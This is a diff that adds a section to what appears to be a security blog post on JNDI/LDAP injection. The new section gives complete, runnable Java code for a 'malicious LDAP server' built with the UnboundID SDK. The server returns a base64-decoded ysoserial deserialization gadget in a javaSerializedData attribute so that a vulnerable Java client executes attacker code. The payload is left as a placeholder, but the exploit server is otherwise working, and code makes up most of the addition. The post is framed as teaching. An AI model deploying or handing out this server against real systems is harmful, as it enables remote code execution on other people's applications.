@@ -235,12 +235,189 @@ layout: default
         <div>So unless the flag is explicitly set to True , the search() is not vulnerable and can be used as it is.</div>
         <h3 style="text-align: left;">Root Cause Analysis:</h3>
         <h3 style="text-align: left;">Building your Own Malicious LDAP Server</h3>
+        <i><b>Note:</b>In real life exploitation you may not find any of the ysoserial gadget working.
+        <br>At that time you need a custom gadget and should be able to integrate that gadget with your own malicous server or available tools.
+    <br>So learning how to build your own Malicious server can you help you with both the cases.</i>
         <div><p>The Ldap server can be built for 2 purpose</p>
         <ul><li>For remote class loading</li>
         <li>For sending Seriliased Data that uses Gadgets present in the class path to Acived RCE</li></ul></div>
+        <div><h4>For sending Seriliased Data that uses Gadgets present in the class path to Acived RCE</h4></div>
+        <p>So lets breka the malicious ldap server into below steps</p>
+        <p>We will be using<a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/7.0.0"> UnboundID LDAP SDK</a></p>
+        <p>
+            <ol>
+                <li>Configure the  in-memory LDAP Serverr</li>
+                <code>
+                    <pre>
+                    public class ldaptest {
+
+                        //Setting up the configuration for the malicious LDAP Server
+                            InMemoryDirectoryServerConfig serverConfiguration() throws LDAPException
+                            {
+                                    InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("random=test");
+                                    InMemoryListenerConfig listenerConfig = InMemoryListenerConfig.createLDAPConfig("default", 1389);
+                                    config.setListenerConfigs(listenerConfig);
+                                    return config;
+                            }
+                        </pre> 
+                </code>
+                <li>Add entries that returns Serialised data for a particular search</li>
+                <code>
+                    <pre>
+                        //Creating Malicous Entries TO send Serilised Data
+                        InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
+                        {
+                            InMemoryDirectoryServerConfig config=serverConfiguration();
+                    
+                    
+                    
+                            //Itnercepting the Call and sending Malcious Response
+                            config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
+                                @Override
+                                public void processSearchResult(InMemoryInterceptedSearchResult result) {
+                                    ReadOnlySearchRequest request = result.getRequest();
+                                    if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
+                                        System.out.println("Inside Malicious EntryFucntion() on custome thing");
+                                        Entry entry = new Entry("o=custom");
+                                        entry.addAttribute("javaClassName", "java.lang.String");
+                                        entry.addAttribute("javaSerializedData", decodedBytes);
+                                        System.out.println("service Response");
+                                        try {
+                                            result.sendSearchEntry(entry);
+                                            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+                                        } catch (LDAPException e) {
+                                            e.printStackTrace();
+                                        }
+                                    } else {
+                                        result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
+                                    }
+                                }
+                            });
+                    
+                    
+                            return config;
+                        }
+                    </pre>
+                </code>
+                <li>Start the ldap server</li>
+                <code><pre>
+                    //Main Method
+                    public static void main(String[] args) {
+                        try {
+                            //Ysoserial Payload
+                            String ser_data="base64 encoded Serilised Gadget Data";
+                            byte[] decodedBytes = Base64.getDecoder().decode(ser_data);
+                
+                
+                            ldaptest obj=new ldaptest();
+                            
+                
+                            //Starts the LDAP Server
+                            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(obj.malicousServerEntryAndResponse(decodedBytes));
+                            ds.startListening();
+                            System.out.println("LDAP Server started on port 1389");
+                
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    }
+
+                    
+                </pre></code>
+                <div><p>
+                    <h4><i>Adding all up a sample malicious LDAP Server code Lokks like below</i></h4>
+                </p>
+                <p>
+                    <code>
+                        <pre>
+import java.util.Base64;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.*;
+
+public class ldaptest {
+
+//Setting up the configuration for the malicious LDAP Server
+    InMemoryDirectoryServerConfig serverConfiguration() throws LDAPException
+    {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("random=test");
+            InMemoryListenerConfig listenerConfig = InMemoryListenerConfig.createLDAPConfig("default", 1389);
+            config.setListenerConfigs(listenerConfig);
+            return config;
+    }
 
 
 
+    //Creating Malicous Entries TO send Serilised Data
+    InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
+    {
+        InMemoryDirectoryServerConfig config=serverConfiguration();
+
+
+
+        //Itnercepting the Call and sending Malcious Response
+        config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
+            @Override
+            public void processSearchResult(InMemoryInterceptedSearchResult result) {
+                ReadOnlySearchRequest request = result.getRequest();
+                if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
+                    System.out.println("Inside Malicious EntryFucntion() on custome thing");
+                    Entry entry = new Entry("o=custom");
+                    entry.addAttribute("javaClassName", "java.lang.String");
+                    entry.addAttribute("javaSerializedData", decodedBytes);
+                    System.out.println("service Response");
+                    try {
+                        result.sendSearchEntry(entry);
+                        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+                    } catch (LDAPException e) {
+                        e.printStackTrace();
+                    }
+                } else {
+                    result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
+                }
+            }
+        });
+
+
+        return config;
+    }
+
+    //Main Method
+    public static void main(String[] args) {
+        try {
+            //Ysoserial Payload
+            String ser_data="base64 encoded Serilised Gadget Data";
+           
+            byte[] decodedBytes = Base64.getDecoder().decode(ser_data);
+
+
+            ldaptest obj=new ldaptest();
+            
+
+            //Starts the LDAP Server
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(obj.malicousServerEntryAndResponse(decodedBytes));
+            ds.startListening();
+            System.out.println("LDAP Server started on port 1389");
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+                        </pre>
+                    </code>
+                </p>
+                </div>
+    </ol>
+    
+</p>
+
+<div><h4>For Remote Class Loading:</h4></div>
         <p>Thats it for Today.</p>
 <p>Thanks For Reading.</p>
 <p>Happy Hacking.</p>
